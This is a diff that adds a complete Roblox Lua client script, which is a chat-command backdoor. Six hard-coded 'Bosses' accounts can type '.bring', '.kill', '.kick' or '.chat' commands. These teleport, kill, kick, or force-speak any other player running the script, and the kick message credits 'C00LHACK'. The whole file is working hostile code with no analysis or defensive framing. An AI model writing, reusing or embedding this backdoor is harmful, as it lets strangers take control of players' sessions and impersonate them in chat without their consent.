@@ -1,0 +1,65 @@
+local Players = game:GetService("Players")
+local TextChatService = game:GetService("TextChatService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local LocalPlayer = Players.LocalPlayer
+
+local Bosses = {
+    "C00LH4CK1124",
+    "Ssukuna_robloxx", 
+    "C00LGAME1412",
+    "Sskidvc",
+    "Sskidv9",
+    "Sskidv7"
+}
+
+local function onBossChatted(speaker, message)
+    local args = string.split(message, " ")
+    local cmd = string.lower(args[1]) 
+    
+    if cmd == ".bring" and args[2] == "users" then
+        if not table.find(Bosses, LocalPlayer.Name) then
+            if speaker and speaker.Character and speaker.Character:FindFirstChild("HumanoidRootPart") then
+                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                    LocalPlayer.Character.HumanoidRootPart.CFrame = speaker.Character.HumanoidRootPart.CFrame
+                end
+            end
+        end
+        
+    elseif cmd == ".kill" and args[2] == "users" then
+        if not table.find(Bosses, LocalPlayer.Name) then
+            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+                LocalPlayer.Character.Humanoid.Health = 0
+            end
+        end
+        
+    elseif cmd == ".kick" and args[2] == "users" then
+        if not table.find(Bosses, LocalPlayer.Name) then
+            LocalPlayer:Kick("You have been kicked by the C00LHACK.")
+        end
+        
+    elseif cmd == ".chat" and args[2] == "users" then
+        local textToSay = string.sub(message, 13)
+        if textToSay ~= "" and not table.find(Bosses, LocalPlayer.Name) then
+            if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+                TextChatService.TextChannels.RBXGeneral:SendAsync(textToSay)
+            elseif ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") then
+                ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(textToSay, "All")
+            end
+        end
+    end
+end
+
+local function checkPlayer(player)
+    if table.find(Bosses, player.Name) then
+        player.Chatted:Connect(function(message)
+            onBossChatted(player, message)
+        end)
+    end
+end
+
+for _, player in ipairs(Players:GetPlayers()) do
+    checkPlayer(player)
+end
+
+Players.PlayerAdded:Connect(checkPlayer)
